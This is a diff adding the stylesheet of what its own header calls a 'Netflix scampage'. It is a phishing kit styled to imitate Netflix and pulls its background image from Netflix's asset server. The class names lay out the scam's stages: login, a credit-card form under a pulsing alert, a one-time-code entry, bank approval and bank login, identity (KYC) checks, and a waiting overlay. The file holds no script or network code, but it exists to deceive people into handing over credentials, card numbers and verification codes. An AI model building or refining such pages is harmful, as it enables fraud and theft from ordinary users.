@@ -1,0 +1,653 @@
+/* ═══════════════════════════════════════════
+   NETFLIX SCAMPAGE 2026 - STYLESHEET
+   ═══════════════════════════════════════════ */
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Netflix Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    background: #000;
+    color: #fff;
+    min-height: 100vh;
+    position: relative;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+}
+
+/* Background */
+.bg-wrapper {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -2;
+}
+
+.bg-image {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: url('https://assets.nflxext.com/ffe/siteui/vlv3/5e16108c-fd30-46de-9bb8-b0a6ed933ecd/7f9031e1-42f1-4049-8ba8-42f3979c0548/US-en-20240205-popsignuptwoweeks-perspective_alpha_website_large.jpg') 
+        center/cover no-repeat;
+    filter: brightness(0.5);
+}
+
+.bg-overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(to top, rgba(0,0,0,0.85) 0%, rgba(0,0,0,0.4) 50%, rgba(0,0,0,0.85) 100%);
+}
+
+/* Header */
+.nf-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 24px 4%;
+    position: relative;
+    z-index: 10;
+}
+
+.nf-logo {
+    width: 167px;
+    display: block;
+    text-decoration: none;
+}
+
+.nf-logo svg {
+    width: 100%;
+    height: auto;
+    display: block;
+}
+
+.lang-selector select {
+    background: rgba(0,0,0,0.4);
+    color: #fff;
+    border: 1px solid #aaa;
+    padding: 8px 16px;
+    border-radius: 2px;
+    font-size: 14px;
+    cursor: pointer;
+    outline: none;
+}
+
+.lang-selector select option {
+    background: #333;
+    color: #fff;
+}
+
+/* Main */
+.nf-main {
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding: 0 4% 60px;
+    min-height: calc(100vh - 200px);
+}
+
+/* Card */
+.nf-card {
+    background: rgba(0,0,0,0.75);
+    border-radius: 4px;
+    padding: 60px 68px 40px;
+    width: 100%;
+    max-width: 450px;
+    position: relative;
+    z-index: 10;
+    backdrop-filter: blur(4px);
+}
+
+.nf-card h1, .nf-card h2 {
+    font-size: 32px;
+    font-weight: 700;
+    margin-bottom: 28px;
+    line-height: 1.2;
+}
+
+.nf-card h2 {
+    font-size: 24px;
+    margin-bottom: 20px;
+}
+
+/* Input */
+.nf-input-wrap {
+    position: relative;
+    margin-bottom: 16px;
+}
+
+.nf-input-wrap input {
+    width: 100%;
+    padding: 16px 20px 0;
+    background: #333;
+    border: none;
+    border-radius: 4px;
+    color: #fff;
+    font-size: 16px;
+    outline: none;
+    transition: background 0.2s, box-shadow 0.2s;
+    height: 50px;
+}
+
+.nf-input-wrap input:focus {
+    background: #454545;
+    box-shadow: 0 0 0 2px rgba(229, 9, 20, 0.3);
+}
+
+.nf-input-wrap label {
+    position: absolute;
+    left: 20px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #8c8c8c;
+    font-size: 16px;
+    pointer-events: none;
+    transition: all 0.2s ease;
+}
+
+.nf-input-wrap input:focus + label,
+.nf-input-wrap input:not(:placeholder-shown) + label {
+    top: 10px;
+    transform: translateY(0);
+    font-size: 11px;
+    color: #b3b3b3;
+}
+
+/* Button */
+.nf-btn {
+    width: 100%;
+    padding: 16px;
+    background: #e50914;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    margin-top: 24px;
+    transition: background 0.2s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    min-height: 50px;
+}
+
+.nf-btn:hover {
+    background: #f40612;
+}
+
+.nf-btn:disabled {
+    background: #666;
+    cursor: not-allowed;
+}
+
+/* Help row */
+.nf-help {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 16px;
+    color: #b3b3b3;
+    font-size: 13px;
+}
+
+.nf-check {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    cursor: pointer;
+}
+
+.nf-check input {
+    accent-color: #737373;
+    width: 16px;
+    height: 16px;
+}
+
+.nf-help a, .nf-signup a, .nf-links a, .resend, .verify-help a {
+    color: #b3b3b3;
+    text-decoration: none;
+    transition: color 0.2s;
+}
+
+.nf-help a:hover, .resend:hover {
+    text-decoration: underline;
+    color: #fff;
+}
+
+.nf-signup {
+    margin-top: 16px;
+    color: #737373;
+    font-size: 16px;
+}
+
+.nf-signup a {
+    color: #fff;
+}
+
+.nf-recaptcha {
+    margin-top: 16px;
+    font-size: 13px;
+    color: #8c8c8c;
+    line-height: 1.4;
+}
+
+.nf-recaptcha a {
+    color: #0071eb;
+    text-decoration: none;
+}
+
+/* CC Card */
+.cc-card {
+    max-width: 500px;
+    padding: 40px 50px;
+}
+
+.alert-box {
+    background: #e50914;
+    border-radius: 4px;
+    padding: 16px 20px;
+    margin-bottom: 24px;
+    display: flex;
+    gap: 12px;
+    align-items: flex-start;
+    animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.85; }
+}
+
+.alert-icon {
+    background: #fff;
+    color: #e50914;
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    flex-shrink: 0;
+    font-size: 14px;
+}
+
+.alert-content {
+    font-size: 14px;
+    line-height: 1.5;
+}
+
+.alert-content strong {
+    display: block;
+    margin-bottom: 4px;
+    font-size: 16px;
+}
+
+.cc-row {
+    display: flex;
+    gap: 12px;
+}
+
+.cc-row .half {
+    flex: 1;
+}
+
+.secure-badge {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    color: #46d369;
+    font-size: 13px;
+    margin: 12px 0;
+}
+
+.back-link {
+    margin-top: 20px;
+    text-align: center;
+}
+
+.back-link a {
+    color: #b3b3b3;
+    text-decoration: none;
+    font-size: 14px;
+    transition: color 0.2s;
+}
+
+.back-link a:hover {
+    text-decoration: underline;
+    color: #fff;
+}
+
+/* Verify Card */
+.verify-card {
+    max-width: 480px;
+    padding: 50px 60px;
+    text-align: center;
+}
+
+.shield-icon {
+    margin-bottom: 20px;
+    display: flex;
+    justify-content: center;
+}
+
+.verify-desc {
+    color: #b3b3b3;
+    font-size: 14px;
+    line-height: 1.5;
+    margin-bottom: 8px;
+}
+
+.verify-desc2 {
+    color: #8c8c8c;
+    font-size: 13px;
+    margin-bottom: 32px;
+}
+
+.code-inputs {
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+    margin-bottom: 24px;
+}
+
+.code-box {
+    width: 50px;
+    height: 60px;
+    background: #333;
+    border: 2px solid #333;
+    border-radius: 4px;
+    color: #fff;
+    font-size: 24px;
+    font-weight: 700;
+    text-align: center;
+    outline: none;
+    transition: border-color 0.2s, background 0.2s, transform 0.1s;
+}
+
+.code-box:focus {
+    border-color: #e50914;
+    background: #454545;
+    transform: scale(1.05);
+}
+
+.timer-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 24px;
+    font-size: 14px;
+    color: #8c8c8c;
+}
+
+.resend {
+    color: #0071eb;
+    font-size: 14px;
+}
+
+/* Approval Card */
+.approval-card {
+    max-width: 480px;
+    padding: 50px;
+    text-align: center;
+}
+
+.bank-logo {
+    font-size: 32px;
+    margin-bottom: 16px;
+}
+
+.approval-desc {
+    color: #b3b3b3;
+    font-size: 14px;
+    margin-bottom: 12px;
+}
+
+.approval-text {
+    color: #8c8c8c;
+    font-size: 13px;
+    margin-bottom: 32px;
+    line-height: 1.5;
+}
+
+/* Bank Card */
+.bank-card {
+    max-width: 480px;
+    padding: 50px;
+    text-align: center;
+}
+
+.bank-header {
+    font-size: 40px;
+    margin-bottom: 16px;
+}
+
+.bank-desc {
+    color: #b3b3b3;
+    font-size: 14px;
+    margin-bottom: 32px;
+}
+
+/* KYC Card */
+.kyc-card {
+    max-width: 500px;
+    padding: 40px 50px;
+}
+
+.kyc-icon {
+    font-size: 40px;
+    text-align: center;
+    margin-bottom: 16px;
+}
+
+.kyc-desc {
+    color: #b3b3b3;
+    font-size: 14px;
+    text-align: center;
+    margin-bottom: 32px;
+}
+
+/* Success */
+.success-icon {
+    width: 60px;
+    height: 60px;
+    background: #46d369;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 28px;
+    color: #fff;
+    margin: 0 auto 20px;
+    animation: scaleIn 0.5s ease;
+}
+
+@keyframes scaleIn {
+    0% { transform: scale(0); }
+    100% { transform: scale(1); }
+}
+
+/* Waiting Overlay */
+.waiting-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.92);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 1000;
+    backdrop-filter: blur(8px);
+}
+
+.waiting-box {
+    text-align: center;
+    padding: 40px;
+}
+
+.waiting-box p {
+    font-size: 18px;
+    margin-top: 20px;
+    color: #fff;
+}
+
+.waiting-sub {
+    font-size: 14px !important;
+    color: #8c8c8c !important;
+    margin-top: 8px !important;
+}
+
+/* Spinners */
+.spinner {
+    display: inline-block;
+    width: 16px;
+    height: 16px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+}
+
+.spinner-large {
+    width: 40px;
+    height: 40px;
+    border: 3px solid rgba(255,255,255,0.2);
+    border-top-color: #e50914;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin: 0 auto;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+/* Footer */
+.nf-footer {
+    margin-top: auto;
+    padding: 30px 4%;
+    background: rgba(0,0,0,0.85);
+    position: relative;
+    z-index: 10;
+}
+
+.nf-footer-inner {
+    max-width: 900px;
+    margin: 0 auto;
+    color: #757575;
+    font-size: 13px;
+}
+
+.nf-footer-inner p {
+    margin-bottom: 20px;
+}
+
+.nf-links {
+    list-style: none;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 16px;
+}
+
+.nf-links li {
+    flex: 0 0 calc(25% - 16px);
+    min-width: 100px;
+}
+
+.nf-links a:hover {
+    text-decoration: underline;
+}
+
+/* RTL Support */
+[dir="rtl"] .nf-input-wrap label {
+    left: auto;
+    right: 20px;
+}
+
+[dir="rtl"] .alert-box {
+    flex-direction: row-reverse;
+}
+
+[dir="rtl"] .nf-help {
+    flex-direction: row-reverse;
+}
+
+[dir="rtl"] .timer-row {
+    flex-direction: row-reverse;
+}
+
+[dir="rtl"] .nf-header {
+    flex-direction: row-reverse;
+}
+
+[dir="rtl"] .cc-row {
+    flex-direction: row-reverse;
+}
+
+/* Mobile */
+@media (max-width: 600px) {
+    .nf-card, .cc-card, .verify-card, .approval-card, .bank-card, .kyc-card {
+        padding: 40px 20px;
+        max-width: 100%;
+        background: #000;
+        border-radius: 0;
+    }
+
+    .nf-header {
+        padding: 20px;
+    }
+
+    .nf-logo {
+        width: 120px;
+    }
+
+    .cc-row {
+        flex-direction: column;
+        gap: 0;
+    }
+
+    .code-box {
+        width: 40px;
+        height: 50px;
+        font-size: 20px;
+    }
+
+    .nf-links li {
+        flex: 0 0 calc(50% - 16px);
+    }
+
+    .bg-image {
+        display: none;
+    }
+
+    body {
+        background: #000;
+    }
+
+    .nf-main {
+        padding: 0;
+        min-height: auto;
+    }
+}
+
+/* Anti-bot / Security layers */
+@media (prefers-reduced-motion: reduce) {
+    * {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+    }
+}
